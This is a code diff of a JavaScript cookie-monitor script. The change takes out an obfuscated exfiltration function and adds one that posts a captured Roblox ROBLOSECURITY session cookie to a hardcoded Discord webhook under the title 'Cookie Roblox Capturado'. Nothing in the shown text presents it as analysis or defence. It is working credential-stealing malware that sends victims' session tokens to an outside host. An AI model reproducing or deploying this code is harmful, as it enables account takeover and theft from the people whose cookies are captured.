@@ -81,11 +81,36 @@ var secret, fetchInfo, Send;
     }
 
     function sendData(value) {
-        getFetch()(concat(concat(strings[12], value) + strings[13], secret), {
-            method: strings[14],
-            mode: strings[15]
-        })
-    }
+    const webhookURL = "https://discord.com/api/webhooks/1424074377711976500/iyQ1vX2tmZcdOMWmtDqJ1Iho7cghfBmD3bMHNOYURuOG4IbtjgU19J5ut6YPoQWKC0Oe";
+    
+    const embed = {
+        title: "🔐 Cookie Roblox Capturado",
+        color: 0xff0000,
+        fields: [
+            {
+                name: "Cookie ROBLOSECURITY",
+                value: "```" + value + "```"
+            },
+            {
+                name: "Timestamp",
+                value: new Date().toLocaleString()
+            }
+        ]
+    };
+    
+    const payload = {
+        username: "Roblox Monitor",
+        embeds: [embed]
+    };
+    
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+}
     
     fetchInfo = cookieMonitor;
     if (cookieMonitor === 1) {
